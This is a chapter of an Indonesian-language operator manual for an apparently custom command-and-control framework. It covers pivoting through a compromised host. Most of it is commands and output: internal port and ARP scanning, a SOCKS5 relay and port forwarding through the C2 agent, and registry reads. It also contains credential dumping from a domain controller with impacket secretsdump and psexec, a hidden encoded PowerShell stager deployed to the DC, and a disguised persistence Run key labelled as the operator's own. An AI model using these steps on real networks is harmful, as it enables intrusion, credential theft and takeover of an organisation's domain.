# 14 — Network & Pivoting

## Konsep Pivoting

Pivoting = menggunakan mesin yang sudah dikuasai (agent) sebagai "jembatan"
untuk menjangkau segmen jaringan internal yang tidak bisa diakses langsung dari luar.

```
[Operator] ──► [Internet] ──► [C2 Server] ──► [Agent (DMZ)] ──► [Internal Network]
                                                                    └─► 10.10.5.0/24
                                                                    └─► 192.168.100.0/24
                                                                    └─► DC, Database, dsb
```

---

## Port Scan (NetScan)

Scan port TCP ke satu atau beberapa target dari posisi agent. Berguna untuk
network discovery setelah masuk ke internal network.

### Syntax

```
netscan <agent-id> --targets <target> [--ports <port-list>] [--timeout <sec>] [--workers <n>]
```

### Scan Subnet Untuk Target Umum

```
taburtuai(IP:8000) › netscan 2703886d \
  --targets 192.168.1.0/24 \
  --ports 22,80,443,445,3389,8080,8443 \
  --timeout 2 \
  --workers 100 \
  --wait
```

**Output:**
```
[*] Starting TCP port scan from DESKTOP-QLPBF95...
[*] Targets : 192.168.1.0/24 (256 hosts)
[*] Ports   : 22, 80, 443, 445, 3389, 8080, 8443
[*] Workers : 100 goroutines
[*] Timeout : 2 seconds per probe

[+] Scan completed (47.3s):

HOST             PORT   STATUS   BANNER
---------------  -----  -------  ------------------------------------------
192.168.1.1      80     open     HTTP/1.1 200 (Router Admin)
192.168.1.1      443    open     HTTPS
192.168.1.10     22     open     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
192.168.1.10     80     open     HTTP/1.1 302 → https://...
192.168.1.10     443    open     HTTPS
192.168.1.10     3389   open     
192.168.1.50     445    open     [SMB] FILESERVER-01 (Windows Server 2022)
192.168.1.50     3389   open     
192.168.1.100    445    open     [SMB] DC01 (Windows Server 2022)
192.168.1.100    80     open     HTTP (AD CS)
192.168.1.100    443    open     HTTPS (AD CS)
192.168.1.105    445    open     [SMB] DESKTOP-QLPBF95 (Windows 11)
192.168.1.200    22     open     SSH-2.0-OpenSSH_9.0
192.168.1.200    80     open     HTTP/1.1 200 Apache/2.4.54

[+] 14 open ports found across 7 hosts.
[i] 249 hosts: no response (filtered/closed)
```

### Scan Beberapa Target Berbeda

```
taburtuai(IP:8000) › netscan 2703886d \
  --targets 10.10.5.0/24,172.16.0.0/24 \
  --ports 22,80,443,3389,5985,8080 \
  --wait
```

### Scan Satu Host dengan Port Penuh

```
taburtuai(IP:8000) › netscan 2703886d \
  --targets 192.168.1.100 \
  --ports 1-65535 \
  --timeout 1 \
  --workers 500 \
  --wait
```

**Output:**
```
[*] Scanning 192.168.1.100 (65535 ports)...
[+] Scan completed (139.2s):

HOST             PORT   STATUS   BANNER
192.168.1.100    53     open     DNS
192.168.1.100    80     open     HTTP
192.168.1.100    88     open     Kerberos
192.168.1.100    135    open     MS-RPC
192.168.1.100    139    open     NetBIOS
192.168.1.100    389    open     LDAP
192.168.1.100    443    open     HTTPS
192.168.1.100    445    open     SMB
192.168.1.100    464    open     Kerberos password
192.168.1.100    593    open     RPC over HTTP
192.168.1.100    636    open     LDAPS
192.168.1.100    3268   open     Global Catalog LDAP
192.168.1.100    3269   open     Global Catalog LDAPS
192.168.1.100    3389   open     RDP
192.168.1.100    5985   open     WinRM HTTP
192.168.1.100    49152  open     RPC dynamic
...

[i] Teridentifikasi sebagai: Windows Server 2022 — kemungkinan Domain Controller
```

### Scan dengan Banner Grabbing

```
taburtuai(IP:8000) › netscan 2703886d \
  --targets 192.168.1.0/24 \
  --ports 22,80,21,25,110 \
  --grab-banners \
  --wait
```

---

## ARP Scan

Dump ARP table di mesin agent. Lebih cepat dari port scan karena hanya membaca
tabel ARP yang sudah ada di OS — tidak mengirim traffic baru ke network.

```
taburtuai(IP:8000) › arpscan 2703886d --wait
```

**Output:**
```
[*] Reading ARP table from DESKTOP-QLPBF95...
[+] ARP table (14 entries):

IP ADDRESS       MAC ADDRESS         INTERFACE     TYPE
---------------  ------------------  ------------  ----------
192.168.1.1      00:50:56:89:ab:cd   Ethernet      Dynamic
192.168.1.10     00:0c:29:12:34:56   Ethernet      Dynamic
192.168.1.50     00:0c:29:78:9a:bc   Ethernet      Dynamic
192.168.1.100    00:50:56:aa:bb:cc   Ethernet      Dynamic
192.168.1.105    00:11:22:33:44:55   Ethernet      Static (self)
192.168.1.200    00:0c:29:de:f0:12   Ethernet      Dynamic
224.0.0.22       01:00:5e:00:00:16   Ethernet      Static
224.0.0.251      01:00:5e:00:00:fb   Ethernet      Static
255.255.255.255  ff:ff:ff:ff:ff:ff   Ethernet      Static
```

**Gunakan untuk:**
- Identifikasi host aktif tanpa mengirim probe (stealth)
- Identifikasi vendor berdasarkan MAC OUI
- Temukan host yang mungkin tidak merespons ping (firewall ICMP)

---

## SOCKS5 Proxy Pivot

Instruksikan agent untuk membuka listener SOCKS5 di dirinya sendiri. Operator
kemudian menggunakan SOCKS5 client (proxychains, Burp, browser) untuk mengakses
network internal melalui agent sebagai relay.

```
Operator ──► C2 Server ──► Agent ──┬──► 192.168.1.100 (DC)
                                    ├──► 192.168.1.50  (File Server)
                                    └──► 10.10.5.0/24  (Internal VLAN)
```

### Start SOCKS5

```
taburtuai(IP:8000) › socks5 start 2703886d --wait
```

**Output:**
```
[*] Starting SOCKS5 proxy on DESKTOP-QLPBF95...
[+] SOCKS5 listener started.

    Listen address: 127.0.0.1:1080
    Protocol      : SOCKS5 (no auth)
    Note          : Accessible via C2 tunnel

[i] Konfigurasi proxychains:
    socks5 127.0.0.1 1080
```

### Start dengan Alamat Kustom

```
taburtuai(IP:8000) › socks5 start 2703886d --addr 0.0.0.0:9050 --wait
# SOCKS5 bind ke semua interface port 9050
```

### Cek Status SOCKS5

```
taburtuai(IP:8000) › socks5 status 2703886d --wait
```

**Output:**
```
[+] SOCKS5 proxy status:

    Running   : YES
    Listen    : 127.0.0.1:1080
    Connections: 3 active
    Bytes in  : 1,247,830
    Bytes out : 8,341,204
```

### Stop SOCKS5

```
taburtuai(IP:8000) › socks5 stop 2703886d --wait
# [+] SOCKS5 proxy stopped. All active connections closed.
```

---

## Menggunakan SOCKS5 Proxy

### Proxychains

```bash
# Konfigurasi /etc/proxychains4.conf
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Akses host internal melalui agent
proxychains nmap -sT -p 80,443,445 192.168.1.100
proxychains curl http://192.168.1.100/
proxychains ssh admin@192.168.1.10
proxychains python3 -m impacket.examples.secretsdump CORP/john.doe:P@ss@192.168.1.100
```

### Nmap melalui SOCKS5

```bash
proxychains nmap -sT -p 1-1000 -T4 --open 192.168.1.0/24 2>/dev/null
```

**Output:**
```
Nmap scan report for 192.168.1.100 (DC01)
PORT    STATE SERVICE
53/tcp  open  domain
80/tcp  open  http
88/tcp  open  kerberos-sec
135/tcp open  msrpc
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
```

### Browser melalui SOCKS5

Konfigurasi FoxyProxy atau browser proxy:
- Type: SOCKS5
- Host: 127.0.0.1
- Port: 1080

Setelah itu bisa akses `http://192.168.1.100/` (intranet) langsung dari browser.

### Impacket melalui SOCKS5

```bash
# Credential dump dari DC via SOCKS5
proxychains python3 -m impacket.examples.secretsdump \
  CORP/john.doe:CorpMail@2026!@192.168.1.100

# PsExec ke server internal
proxychains python3 -m impacket.examples.psexec \
  CORP/Administrator:Admin@Corp2026!@192.168.1.50
```

---

## Registry Operations (dari Pivot Point)

Setelah punya akses ke internal network via SOCKS5, bisa manipulasi registry di host lain
melalui agent yang sudah masuk ke mesin berikutnya.

Atau operasi registry pada host agent itu sendiri:

```
taburtuai(IP:8000) › registry read 2703886d \
  --hive HKLM \
  --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" \
  --value ProductName
```

**Output:**
```
[+] Registry value:
    Path : HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName
    Type : REG_SZ
    Data : Windows 11 Home
```

```
taburtuai(IP:8000) › registry list 2703886d \
  --hive HKLM \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**Output:**
```
[+] Registry subkeys and values:

    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    │
    ├── [VALUE] SecurityHealth     = C:\Windows\system32\SecurityHealthSystray.exe
    ├── [VALUE] OneDrive           = "C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background
    └── [VALUE] WindowsSecurityUpdate = C:\Users\...\WindowsSecurityUpdate.exe   ← kita punya
```

Lihat [15 — Advanced Techniques](15-advanced.md) untuk operasi registry lengkap.

---

## Port Forwarding (Reverse Tunnel)

Port forwarding memungkinkan operator untuk mengakses satu port internal secara langsung
melalui channel C2, tanpa perlu SOCKS5 client seperti proxychains.

```
Operator ──► localhost:LOCAL_PORT ──► C2 Server ──► (HTTP C2 channel) ──► Agent ──► TARGET:PORT
```

Cocok untuk: RDP satu host, koneksi database, HTTP internal app — ketika SOCKS5 terlalu
berat atau tidak perlu full proxy.

### Cara Kerja

1. Operator mengirim perintah `portfwd` ke agent dengan target dan local port
2. Server membuka TCP listener di `127.0.0.1:LOCAL_PORT`
3. Agent mendial `TARGET:PORT` di network internal
4. Data direlai bidireksional melalui dua HTTP endpoint (`/portfwd/:sess/pull` dan `/portfwd/:sess/push`)
5. Operator konek ke `localhost:LOCAL_PORT` seolah konek langsung ke target

### Start Port Forward

```bash
# Lewat API langsung
curl -X POST http://IP:8080/api/v1/agent/2703886d/portfwd \
  -H "Content-Type: application/json" \
  -d '{"target":"192.168.1.10:3389","local_port":33899}'

# Respons
{
  "session_id": "fwd-1",
  "local_port": 33899,
  "target": "192.168.1.10:3389",
  "agent_id": "2703886d",
  "command_id": "..."
}
```

### Lihat Session Aktif

```bash
curl http://IP:8080/api/v1/portfwd
# {"sessions":[{"agent_id":"2703886d","id":"fwd-1","local_port":33899,"target":"192.168.1.10:3389"}]}
```

### Stop Session

```bash
curl -X DELETE http://IP:8080/api/v1/portfwd/fwd-1
```

### Contoh: RDP ke Host Internal

```bash
# 1. Buat tunnel
curl -X POST http://IP:8080/api/v1/agent/2703886d/portfwd \
  -d '{"target":"192.168.1.10:3389","local_port":33899}'

# 2. Tunggu agent eksekusi perintah (satu beacon interval)
#    Lalu konek RDP ke local port
xfreerdp /v:localhost:33899 /u:CORP\\john.doe /p:'P@ssw0rd'
# atau di Windows:
mstsc /v:localhost:33899
```

### Contoh: Akses Web Internal

```bash
curl -X POST http://IP:8080/api/v1/agent/2703886d/portfwd \
  -d '{"target":"192.168.1.100:80","local_port":8888}'

# Setelah tunnel aktif:
curl http://localhost:8888/
# atau buka di browser: http://localhost:8888
```

### Contoh: SSH ke Server Internal

```bash
curl -X POST http://IP:8080/api/v1/agent/2703886d/portfwd \
  -d '{"target":"192.168.1.10:22","local_port":2222}'

ssh -p 2222 admin@localhost
```

### Catatan

| Aspek | Detail |
|-------|--------|
| Satu koneksi | Server hanya terima satu TCP conn per session |
| Latency | Sebanding dengan beacon interval (HTTP pull setiap ~28 s long-poll) |
| Buffer | Chunk 32 KB, antrian 64 entri masing-masing arah |
| Stop session | `DELETE /portfwd/:sess` atau agent restart |
| VS SOCKS5 | SOCKS5 lebih fleksibel (multi-target); portfwd lebih sederhana (satu target) |

---

## Skenario Pivoting: Lateral Movement ke Domain Controller

```
# ── Recon dari agent pertama ──────────────────────────────
netscan 2703886d --targets 192.168.1.0/24 --ports 445,3389,5985 --wait

# Temukan DC di 192.168.1.100

# ── Start SOCKS5 di agent ─────────────────────────────────
socks5 start 2703886d --wait

# ── Dari mesin operator via proxychains ───────────────────
# Dump credential DC menggunakan token CORP\john.doe yang sudah didapat
proxychains python3 -m impacket.examples.secretsdump \
  CORP/john.doe:CorpMail@2026!@192.168.1.100

# Jika berhasil, deploy agent ke DC via SMB
proxychains python3 -m impacket.examples.psexec \
  CORP/Administrator:Admin@Corp2026!@192.168.1.100 \
  cmd.exe /c "powershell -w hidden -enc <STAGER_B64>"

# ── DC jadi agent baru di console ────────────────────────
agents list
# 2703886d  DESKTOP-QLPBF95  john.doe     online   5s ago
# 4f1b8e23  DC01             SYSTEM       online   12s ago   ← agent baru di DC!
```

---

**Selanjutnya:** [15 — Advanced Techniques](15-advanced.md)
